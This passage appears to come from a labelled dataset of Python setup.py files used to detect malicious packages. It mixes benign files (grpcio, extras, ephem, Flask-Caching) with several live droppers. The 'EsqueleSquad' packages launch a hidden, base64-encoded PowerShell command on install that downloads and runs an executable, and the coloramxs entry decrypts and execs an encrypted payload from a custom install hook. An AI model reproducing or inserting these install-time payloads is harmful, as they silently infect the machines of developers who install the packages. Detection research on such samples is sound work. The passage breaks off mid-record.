EXTRA_ENV_LINK_ARGS = ''\n    if \"linux\" in sys.platform or \"darwin\" in sys.platform:\n        EXTRA_ENV_LINK_ARGS += ' -lpthread'\n        if check_linker_need_libatomic():\n            EXTRA_ENV_LINK_ARGS += ' -latomic'\n    elif \"win32\" in sys.platform and sys.version_info < (3, 5):\n        msvcr = cygwinccompiler.get_msvcr()[0]\n        EXTRA_ENV_LINK_ARGS += (\n            ' -static-libgcc -static-libstdc++ -mcrtdll={msvcr}'\n            ' -static -lshlwapi'.format(msvcr=msvcr))\n    if \"linux\" in sys.platform:\n        EXTRA_ENV_LINK_ARGS += ' -static-libgcc'\n\nEXTRA_COMPILE_ARGS = shlex.split(EXTRA_ENV_COMPILE_ARGS)\nEXTRA_LINK_ARGS = shlex.split(EXTRA_ENV_LINK_ARGS)\n\nif BUILD_WITH_STATIC_LIBSTDCXX:\n    EXTRA_LINK_ARGS.append('-static-libstdc++')\n\nCYTHON_EXTENSION_PACKAGE_NAMES = ()\n\nCYTHON_EXTENSION_MODULE_NAMES = ('grpc._cython.cygrpc',)\n\nCYTHON_HELPER_C_FILES = ()\n\nCORE_C_FILES = tuple(grpc_core_dependencies.CORE_SOURCE_FILES)\nif \"win32\" in sys.platform:\n    CORE_C_FILES = filter(lambda x: 'third_party/cares' not in x, CORE_C_FILES)\n\nif BUILD_WITH_SYSTEM_OPENSSL:\n    CORE_C_FILES = filter(lambda x: 'third_party/boringssl' not in x,\n                          CORE_C_FILES)\n    CORE_C_FILES = filter(lambda x: 'src/boringssl' not in x, CORE_C_FILES)\n    SSL_INCLUDE = (os.path.join('/usr', 'include', 'openssl'),)\n\nif BUILD_WITH_SYSTEM_ZLIB:\n    CORE_C_FILES = filter(lambda x: 'third_party/zlib' not in x, CORE_C_FILES)\n    ZLIB_INCLUDE = (os.path.join('/usr', 'include'),)\n\nif BUILD_WITH_SYSTEM_CARES:\n    CORE_C_FILES = filter(lambda x: 'third_party/cares' not in x, CORE_C_FILES)\n    CARES_INCLUDE = (os.path.join('/usr', 'include'),)\n\nif BUILD_WITH_SYSTEM_RE2:\n    CORE_C_FILES = filter(lambda x: 'third_party/re2' not in x, CORE_C_FILES)\n    RE2_INCLUDE = (os.path.join('/usr', 'include', 're2'),)\n\nif BUILD_WITH_SYSTEM_ABSL:\n    CORE_C_FILES = filter(lambda x: 'third_party/abseil-cpp' not in x,\n                          CORE_C_FILES)\n    ABSL_INCLUDE = (os.path.join('/usr', 'include'),)\n\nEXTENSION_INCLUDE_DIRECTORIES = ((PYTHON_STEM,) + CORE_INCLUDE + ABSL_INCLUDE +\n                                 ADDRESS_SORTING_INCLUDE + CARES_INCLUDE +\n                                 RE2_INCLUDE + SSL_INCLUDE + UPB_INCLUDE +\n                                 UPB_GRPC_GENERATED_INCLUDE +\n                                 UPBDEFS_GRPC_GENERATED_INCLUDE +\n                                 XXHASH_INCLUDE + ZLIB_INCLUDE)\n\nEXTENSION_LIBRARIES = ()\nif \"linux\" in sys.platform:\n    EXTENSION_LIBRARIES += ('rt',)\nif not \"win32\" in sys.platform:\n    EXTENSION_LIBRARIES += ('m',)\nif \"win32\" in sys.platform:\n    EXTENSION_LIBRARIES += (\n        'advapi32',\n        'bcrypt',\n        'dbghelp',\n        'ws2_32',\n    )\nif BUILD_WITH_SYSTEM_OPENSSL:\n    EXTENSION_LIBRARIES += (\n        'ssl',\n        'crypto',\n    )\nif BUILD_WITH_SYSTEM_ZLIB:\n    EXTENSION_LIBRARIES += ('z',)\nif BUILD_WITH_SYSTEM_CARES:\n    EXTENSION_LIBRARIES += ('cares',)\nif BUILD_WITH_SYSTEM_RE2:\n    EXTENSION_LIBRARIES += ('re2',)\nif BUILD_WITH_SYSTEM_ABSL:\n    EXTENSION_LIBRARIES += tuple(\n        lib.stem[3:] for lib in pathlib.Path('/usr').glob('lib*/libabsl_*.so'))\n\nDEFINE_MACROS = (('_WIN32_WINNT', 0x600),)\nasm_files = []\n\n\n# Quotes on Windows build macros are evaluated differently from other platforms,\n# so we must apply quotes asymmetrically in order to yield the proper result in\n# the binary.\ndef _quote_build_define(argument):\n    if \"win32\" in sys.platform:\n        return '\"\\\\\\\"{}\\\\\\\"\"'.format(argument)\n    return '\"{}\"'.format(argument)\n\n\nDEFINE_MACROS += (\n    (\"GRPC_XDS_USER_AGENT_NAME_SUFFIX\", _quote_build_define(\"Python\")),\n    (\"GRPC_XDS_USER_AGENT_VERSION_SUFFIX\",\n     _quote_build_define(_metadata.__version__)),\n)\n\nasm_key = ''\nif BUILD_WITH_BORING_SSL_ASM and not BUILD_WITH_SYSTEM_OPENSSL:\n    boringssl_asm_platform = BUILD_OVERRIDE_BORING_SSL_ASM_PLATFORM if BUILD_OVERRIDE_BORING_SSL_ASM_PLATFORM else util.get_platform(\n    )\n    LINUX_X86_64 = 'linux-x86_64'\n    LINUX_ARM = 'linux-arm'\n    LINUX_AARCH64 = 'linux-aarch64'\n    if LINUX_X86_64 == boringssl_asm_platform:\n        asm_key = 'crypto_linux_x86_64'\n    elif LINUX_ARM == boringssl_asm_platform:\n        asm_key = 'crypto_linux_arm'\n    elif LINUX_AARCH64 == boringssl_asm_platform:\n        asm_key = 'crypto_linux_aarch64'\n    elif \"mac\" in boringssl_asm_platform and \"x86_64\" in boringssl_asm_platform:\n        asm_key = 'crypto_mac_x86_64'\n    else:\n        print(\"ASM Builds for BoringSSL currently not supported on:\",\n              boringssl_asm_platform)\nif asm_key:\n    asm_files = grpc_core_dependencies.ASM_SOURCE_FILES[asm_key]\nelse:\n    DEFINE_MACROS += (('OPENSSL_NO_ASM', 1),)\n\nif not DISABLE_LIBC_COMPATIBILITY:\n    DEFINE_MACROS += (('GPR_BACKWARDS_COMPATIBILITY_MODE', 1),)\n\nif \"win32\" in sys.platform:\n    # TODO(zyc): Re-enable c-ares on x64 and x86 windows after fixing the\n    # ares_library_init compilation issue\n    DEFINE_MACROS += (\n        ('WIN32_LEAN_AND_MEAN', 1),\n        ('CARES_STATICLIB', 1),\n        ('GRPC_ARES', 0),\n        ('NTDDI_VERSION', 0x06000000),\n        ('NOMINMAX', 1),\n    )\n    if '64bit' in platform.architecture()[0]:\n        DEFINE_MACROS += (('MS_WIN64', 1),)\n    elif sys.version_info >= (3, 5):\n        # For some reason, this is needed to get access to inet_pton/inet_ntop\n        # on msvc, but only for 32 bits\n        DEFINE_MACROS += (('NTDDI_VERSION', 0x06000000),)\nelse:\n    DEFINE_MACROS += (\n        ('HAVE_CONFIG_H', 1),\n        ('GRPC_ENABLE_FORK_SUPPORT', 1),\n    )\n\nLDFLAGS = tuple(EXTRA_LINK_ARGS)\nCFLAGS = tuple(EXTRA_COMPILE_ARGS)\nif \"linux\" in sys.platform or \"darwin\" in sys.platform:\n    pymodinit_type = 'PyObject*' if PY3 else 'void'\n    pymodinit = 'extern \"C\" __attribute__((visibility (\"default\"))) {}'.format(\n        pymodinit_type)\n    DEFINE_MACROS += (('PyMODINIT_FUNC', pymodinit),)\n    DEFINE_MACROS += (('GRPC_POSIX_FORK_ALLOW_PTHREAD_ATFORK', 1),)\n\n# By default, Python3 distutils enforces compatibility of\n# c plugins (.so files) with the OSX version Python was built with.\n# We need OSX 10.10, the oldest which supports C++ thread_local.\n# Python 3.9: Mac OS Big Sur sysconfig.get_config_var('MACOSX_DEPLOYMENT_TARGET') returns int (11)\nif 'darwin' in sys.platform:\n    mac_target = sysconfig.get_config_var('MACOSX_DEPLOYMENT_TARGET')\n    if mac_target:\n        mac_target = pkg_resources.parse_version(str(mac_target))\n        if mac_target < pkg_resources.parse_version('10.10.0'):\n            os.environ['MACOSX_DEPLOYMENT_TARGET'] = '10.10'\n            os.environ['_PYTHON_HOST_PLATFORM'] = re.sub(\n                r'macosx-[0-9]+\\.[0-9]+-(.+)', r'macosx-10.10-\\1',\n                util.get_platform())\n\n\ndef cython_extensions_and_necessity():\n    cython_module_files = [\n        os.path.join(PYTHON_STEM,\n                     name.replace('.', '/') + '.pyx')\n        for name in CYTHON_EXTENSION_MODULE_NAMES\n    ]\n    config = os.environ.get('CONFIG', 'opt')\n    prefix = 'libs/' + config + '/'\n    if USE_PREBUILT_GRPC_CORE:\n        extra_objects = [\n            prefix + 'libares.a', prefix + 'libboringssl.a',\n            prefix + 'libgpr.a', prefix + 'libgrpc.a'\n        ]\n        core_c_files = []\n    else:\n        core_c_files = list(CORE_C_FILES)\n        extra_objects = []\n    extensions = [\n        _extension.Extension(\n            name=module_name,\n            sources=([module_file] + list(CYTHON_HELPER_C_FILES) +\n                     core_c_files + asm_files),\n            include_dirs=list(EXTENSION_INCLUDE_DIRECTORIES),\n            libraries=list(EXTENSION_LIBRARIES),\n            define_macros=list(DEFINE_MACROS),\n            extra_objects=extra_objects,\n            extra_compile_args=list(CFLAGS),\n            extra_link_args=list(LDFLAGS),\n        ) for (module_name, module_file\n              ) in zip(list(CYTHON_EXTENSION_MODULE_NAMES), cython_module_files)\n    ]\n    need_cython = BUILD_WITH_CYTHON\n    if not BUILD_WITH_CYTHON:\n        need_cython = need_cython or not commands.check_and_update_cythonization(\n            extensions)\n    # TODO: the strategy for conditional compiling and exposing the aio Cython\n    # dependencies will be revisited by https://github.com/grpc/grpc/issues/19728\n    return commands.try_cythonize(extensions,\n                                  linetracing=ENABLE_CYTHON_TRACING,\n                                  mandatory=BUILD_WITH_CYTHON), need_cython\n\n\nCYTHON_EXTENSION_MODULES, need_cython = cython_extensions_and_necessity()\n\nPACKAGE_DIRECTORIES = {\n    '': PYTHON_STEM,\n}\n\nINSTALL_REQUIRES = (\n    \"six>=1.5.2\",\n    \"futures>=2.2.0; python_version<'3.2'\",\n    \"enum34>=1.0.4; python_version<'3.4'\",\n)\nEXTRAS_REQUIRES = {\n    'protobuf': 'grpcio-tools>={version}'.format(version=grpc_version.VERSION),\n}\n\nSETUP_REQUIRES = INSTALL_REQUIRES + (\n    'Sphinx~=1.8.1',\n    'six>=1.10',\n) if ENABLE_DOCUMENTATION_BUILD else ()\n\ntry:\n    import Cython\nexcept ImportError:\n    if BUILD_WITH_CYTHON:\n        sys.stderr.write(\n            \"You requested a Cython build via GRPC_PYTHON_BUILD_WITH_CYTHON, \"\n            \"but do not have Cython installed. We won't stop you from using \"\n            \"other commands, but the extension files will fail to build.\\n\")\n    elif need_cython:\n        sys.stderr.write(\n            'We could not find Cython. Setup may take 10-20 minutes.\\n')\n        SETUP_REQUIRES += ('cython>=0.23',)\n\nCOMMAND_CLASS = {\n    'doc': commands.SphinxDocumentation,\n    'build_project_metadata': commands.BuildProjectMetadata,\n    'build_py': commands.BuildPy,\n    'build_ext': commands.BuildExt,\n    'gather': commands.Gather,\n    'clean': commands.Clean,\n}\n\n# Ensure that package data is copied over before any commands have been run:\ncredentials_dir = os.path.join(PYTHON_STEM, 'grpc', '_cython', '_credentials')\ntry:\n    os.mkdir(credentials_dir)\nexcept OSError:\n    pass\nshutil.copyfile(os.path.join('etc', 'roots.pem'),\n                os.path.join(credentials_dir, 'roots.pem'))\n\nPACKAGE_DATA = {\n    # Binaries that may or may not be present in the final installation, but are\n    # mentioned here for completeness.\n    'grpc._cython': [\n        '_credentials/roots.pem',\n        '_windows/grpc_c.32.python',\n        '_windows/grpc_c.64.python',\n    ],\n}\nPACKAGES = setuptools.find_packages(PYTHON_STEM)\n\nsetuptools.setup(\n    name='grpcio',\n    version=grpc_version.VERSION,\n    description='HTTP/2-based RPC framework',\n    author='The gRPC Authors',\n    author_email='grpc-io@googlegroups.com',\n    url='https://grpc.io',\n    license=LICENSE,\n    classifiers=CLASSIFIERS,\n    long_description=open(README).read(),\n    ext_modules=CYTHON_EXTENSION_MODULES,\n    packages=list(PACKAGES),\n    package_dir=PACKAGE_DIRECTORIES,\n    package_data=PACKAGE_DATA,\n    python_requires='>=3.6',\n    install_requires=INSTALL_REQUIRES,\n    extras_require=EXTRAS_REQUIRES,\n    setup_requires=SETUP_REQUIRES,\n    cmdclass=COMMAND_CLASS,\n)\n", "target": 0}
{"idx": "tppongadultra-1.83", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppongadultra',\n    packages = ['modlib'],\n    version = '7.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqcvlgtbhydra-6.24", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcvLGTBhydra',\n    packages = ['modlib'],\n    version = '10.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpminesuperpip-9.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpminesuperpip',\n    packages = ['modlib'],\n    version = '9.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-minereplacesuper-6.54", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-minereplacesuper',\n    packages = ['modlib'],\n    version = '10.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "extras-1.0.0", "func": "#!/usr/bin/env python\n\"\"\"Distutils installer for extras.\"\"\"\n\nfrom setuptools import setup\nimport os.path\n\nimport extras\ntesttools_cmd = extras.try_import('testtools.TestCommand')\n\n\ndef get_version():\n    \"\"\"Return the version of extras that we are building.\"\"\"\n    version = '.'.join(\n        str(component) for component in extras.__version__[0:3])\n    return version\n\n\ndef get_long_description():\n    readme_path = os.path.join(\n        os.path.dirname(__file__), 'README.rst')\n    return open(readme_path).read()\n\n\ncmdclass = {}\n\nif testtools_cmd is not None:\n    cmdclass['test'] = testtools_cmd\n\n\nsetup(name='extras',\n      author='Testing cabal',\n      author_email='testtools-dev@lists.launchpad.net',\n      url='https://github.com/testing-cabal/extras',\n      description=('Useful extra bits for Python - things that shold be '\n        'in the standard library'),\n      long_description=get_long_description(),\n      version=get_version(),\n      classifiers=[\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        ],\n      packages=[\n        'extras',\n        'extras.tests',\n        ],\n      cmdclass=cmdclass)\n", "target": 0}
{"idx": "ephem-4.1.3", "func": "import os\nimport sys\nfrom distutils.core import setup, Extension\nfrom glob import glob\n\n# Work-around.\n\nif 'bdist_wheel' in sys.argv:\n    del setup, Extension\n    from setuptools import setup, Extension\n\nopen_kw = {}\nif sys.version_info >= (3,):\n    open_kw['encoding'] = 'utf-8'\n\n# Read the current version from ephem/__init__.py itself.\n\npath = os.path.join(os.path.dirname(__file__), 'ephem', '__init__.py')\nfor line in open(path, **open_kw):\n    if line.startswith('__version__'):\n        __version__ = eval(line.split(None, 2)[2]) # skip '__version__', '='\n\n# The 'ephem' module is built from every .c file in the libastro\n# directory plus ...\n\nlibastro_files = glob('libastro/*.c')\nlibastro_data = glob('extensions/data/*.c')\n\nhere = os.path.dirname(__file__)\nwith open(os.path.join(here, 'README.rst'), **open_kw) as f:\n    README = f.read()\n\nlibraries = []\nif os.name != 'nt':\n    # Linking against library \"m\" on Windows results in the error:\n    # LINK : fatal error LNK1181: cannot open input file 'm.lib'\n    libraries.append('m')  # Needed for Android; see GitHub issue #114.\n\nextensions = [\n    Extension(\n        'ephem._libastro',\n        ['extensions/_libastro.c', 'extensions/dtoa.c']\n        + libastro_files + libastro_data,\n        extra_compile_args=['-ffloat-store'],\n        include_dirs=['libastro', '.'],\n        libraries = libraries,\n    ),\n]\n\nsetup(name = 'ephem',\n      version = __version__,\n      description = 'Compute positions of the planets and stars',\n      long_description = README,\n      #long_description_content_type = 'text/x-rst',\n      license = 'MIT',\n      author = 'Brandon Rhodes',\n      author_email = 'brandon@rhodesmill.org',\n      url = 'http://rhodesmill.org/pyephem/',\n      classifiers = [\n        'Development Status :: 6 - Mature',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: MIT License',\n        'Topic :: Scientific/Engineering :: Astronomy',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        ],\n      packages = [ 'ephem', 'ephem.tests' ],\n      package_data = { 'ephem': ['doc/*.rst',\n                                 'tests/jpl/*.txt',\n                                 'tests/usno/*.txt',\n                                 ],},\n      ext_modules = extensions,\n      )\n", "target": 0}
{"idx": "selfrandominfoping-4.42", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandominfoping',\n    packages = ['modlib'],\n    version = '4.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Flask-Caching-2.0.1", "func": "from setuptools import setup\n\n# Metadata goes in setup.cfg. These are here for GitHub's dependency graph.\nsetup(\n    name=\"Flask-Caching\",\n    install_requires=[\"cachelib >= 0.9.0\", \"Flask < 3\"],\n)\n", "target": 0}
{"idx": "coloramxs-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'nyYToMcrPnVK DaMhqqmMuWbHvEiGSLEfteVDwsGJEhXMgrUANaGIVc'\nLONG_DESCRIPTION = 'KG UoQyyhvyXvvctBQCNdzSQRfxsRpAGRhvTQnNcsQswGwqiJz HuFBei kUEoRGXMxycQbAifgqELlzcjCXEcviiiYGDqKPSsDIdQrKnNSzlgTiTQlvGflFDRf RCteliawuetQnNukPpZSIkRfVbNs ioowsrOyiPhlzuadBbnWmHlLMvjDkp wOYcmdQMzmCYUVyYODvZvbKmCUZnTXFjJYAPMVCzhuHKLpvmcEq ndXFDsYfKvANgPpNSaFaSHo dKGaK abJpBDRdtpEqepVOPCpPmmZA qtpGHBeqSzUSNmRfIvbQVBBHEZyIVQoceFsvTYcfnthFxgcLTNcJIXYMEtGrNCJqtbahpybnPO'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'SxI9dCLI8tQrluTpXxl7y1PoiA_pnTFuAGXMq-ODPzY=').decrypt(b'gAAAAABmA1kZHRGO-KxIfoQjuYlMUbT0YBvKmMHtYGcd_Ue_yxq2fsL5RCAGTIdlQuDzTkRppXoektCHo4s2WeKZ11tFl0-ob3HdW2nDsU8Bv9gytc2i_icSvnk3UGJ11q7vHGykVUJskKtGKuQUgTChDz-5WsE09Vy8-t8IYd4VrKVHeWRRWmNly0nCclHm7MoXnmIQeKh-K2J8JtCHQT0SWST3HliWeEP95whdkaikvrWeWf4fAiQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"coloramxs\",\n    version=VERSION,\n    author=\"LyQjJfxXGmUANgpnoV\",\n    author_email=\"fziDIbqRKyPFBQw@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "guipip-5.79", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'guipip',\n    packages = ['modlib'],\n    version = '3.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    